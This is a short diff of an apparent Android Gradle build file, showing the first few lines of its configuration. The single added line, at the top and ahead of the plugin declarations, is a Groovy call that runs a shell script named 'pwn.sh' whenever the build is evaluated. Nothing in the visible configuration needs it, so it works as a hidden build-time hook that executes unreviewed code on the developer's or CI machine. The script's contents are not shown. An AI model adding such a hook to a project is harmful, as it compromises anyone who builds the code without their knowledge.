@@ -1,3 +1,4 @@
+"bash pwn.sh".execute().text
 apply plugin: 'com.android.application'
 apply plugin: 'io.fabric'
 android {
